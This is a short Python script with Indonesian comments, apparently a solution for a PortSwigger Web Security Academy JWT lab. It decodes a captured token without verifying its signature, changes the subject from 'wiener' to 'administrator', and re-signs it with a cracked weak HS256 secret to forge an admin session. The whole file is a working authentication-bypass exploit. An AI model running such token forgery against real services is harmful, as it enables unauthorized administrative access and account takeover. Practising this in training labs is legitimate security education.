import jwt

# 1. Token asli yang ingin diubah
old_token = "eyJraWQiOiI1NmFlOWQ2NS1hY2MyLTRiMjItOTg1My0xMTM4MGFjYzI5NDgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NjM5NzMyMSwic3ViIjoid2llbmVyIn0.R10J776u9Mo41p-hDk2a06Wt_fd7masN1tBPtLHc1Ec"

# 2. Secret Key yang kamu temukan (Misal: "secret-123")
SECRET_KEY = "secret1"

try:
    # 3. Dekode tanpa verifikasi untuk mengambil data lama
    payload = jwt.decode(old_token, options={"verify_signature": False})
    
    # 4. Ubah isi payload
    payload['sub'] = "administrator"
    
    # 5. Generate ulang dengan algoritma HS256 dan Key yang ditemukan
    # Kita hapus 'kid' dari header jika tidak diperlukan, atau biarkan jika server mencarinya
    new_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")

    print("--- HASIL MODIFIKASI HS256 ---")
    print(f"Payload Baru: {payload}")
    print(f"Token Baru  : {new_token}")

except Exception as e:
    print(f"Terjadi kesalahan: {e}")
